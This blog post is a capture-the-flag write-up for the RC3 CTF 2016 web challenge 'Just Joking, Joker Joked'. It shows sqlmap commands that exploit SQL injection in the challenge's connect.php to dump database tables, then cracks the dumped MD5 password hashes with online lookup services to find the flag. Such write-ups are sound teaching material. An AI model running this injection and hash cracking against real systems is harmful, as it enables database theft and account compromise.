---
layout: post
title: "RC3 CTF : Just Joking, Joker Joked"
author: dade
date: 2016-11-20 13:37:57 -0700
slug: bork-bork
category:
- 2016
- rc3ctf
---
**Category:** Web

**Points:** 200

**Description:**

```
Yes, that is gramatically correct. Now who doesn't love a good book and an even better villain?

https://ctf.rc3.club:2010/

With Love,

Joker xx

"Hint: 200: Flags aren't in plaintext"
```

# Investigation
I kind of cheated here, I normally wouldn't resort to running sqlmap immediately. But in the end, I used it to dumb tables.

```
$ sqlmap -u "https://ctf.rc3.club:2010/connect.php?primary=" --dbs
$ sqlmap -u "https://ctf.rc3.club:2010/connect.php?primary=" --tables
$ sqlmap -u "https://ctf.rc3.club:2010/connect.php?primary=" -D CCNs -T basic
$ sqlmap -u "https://ctf.rc3.club:2010/connect.php?primary=" -D CCNs -T secrets
```
I used this to dump tables, I also dumped the rest of the tables but nothing looked especially interesting.

```
CCNs
	basic
	+----+--------------+--------+
	| id | name         | gender |
	+----+--------------+--------+
	| 1  | Harley Quinn | Female |
	| 2  | Riddler      | ?      |
	| 3  | Joker        | HAHAHA |
	| 5  | Two-Face     | Male   |
	+----+--------------+--------+
	secrets
	+----+---------+----------------------------------+
	| id | User    | Password                         |
	+----+---------+----------------------------------+
	| 1  | Admin   | 3118dd54268acb0f04a048fd090e14f7 |
	| 2  | Guy     | c9846fa3e401252cf822a21ecf6a567e |
	| 3  | Joker   | c417fccfc5d5a288243c96359c62c381 |
	| 4  | Colonel | adac9d4711cd21cc4cec1b0f8e7ca538 |
	+----+---------+----------------------------------+
```

Looking at the flag.welcome table, the flag claims to be pcbfcppgle. I also happen to be told in the hint that "flags aren't in plaintext" so let's rotate that flag.

Using my favorite [caesar cipher tool](http://www.xarg.org/tools/caesar-cipher/) we put that in and choose "Guess" for the key, and it finds that with a key of 2 the flag translates to redherring. How annoying.


Looking at the CCNs.secrets table, we see some hashes. Let's try to crack (https://crackstation.net) those.

3118dd54268acb0f04a048fd090e14f7 -> NiceTry

Again, how annoying.

!(https://i.ytimg.com/vi/ZZ81_Wkykfo/hqdefault.jpg)

Let's see if any online databases have the other hashes.


Crackstation? Nope.


Hashkiller? Nope.


MD5Decrypt.org? Yup.

```
3118dd54268acb0f04a048fd090e14f7 -> NiceTry
c9846fa3e401252cf822a21ecf6a567e -> InfectiousLaughter
c417fccfc5d5a288243c96359c62c381 -> RC3-2016-HAHAHAHA
adac9d4711cd21cc4cec1b0f8e7ca538 -> TheRealSanders
```

# Flag
**RC3-2016-HAHAHAHA**
